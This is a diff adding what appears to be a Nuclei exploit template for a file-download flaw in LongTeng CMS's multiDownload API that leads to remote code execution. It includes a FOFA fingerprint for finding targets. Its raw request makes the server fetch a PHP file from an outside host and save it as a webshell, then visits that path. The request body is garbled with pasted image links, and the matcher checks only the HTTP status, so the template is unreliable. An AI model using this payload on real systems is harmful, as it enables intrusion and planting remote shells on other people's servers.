@@ -1,0 +1,49 @@
+id: poc-frceana5oxat2pf4
+info:
+  name: 龙腾CMS multiDownload存在文件下载漏洞致远程命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/frceana5oxat2pf4'
+  tags: rce,lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: frceana5oxat2pf4
+    fofa: icon_hash="-803002403"
+http:
+- raw:
+  - 'GET /api/file/multiDownload?file=http://ip/1.php&savePath=dsg15ds6g1sd.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+    Cookie: cms_session=uck8lfsr72os4v8oblfa74upli
+
+    Upgrade-Insecure-Requests: 1
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: cross-site
+
+    Priority: u=0, i
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974679470-5dc91389-46da-4444-bd51-68e7c6460808.png)
+
+    /dsg15ds6g1sd.php
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974679770-47818eac-1e04-457a-a4a0-d07fbb701056.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
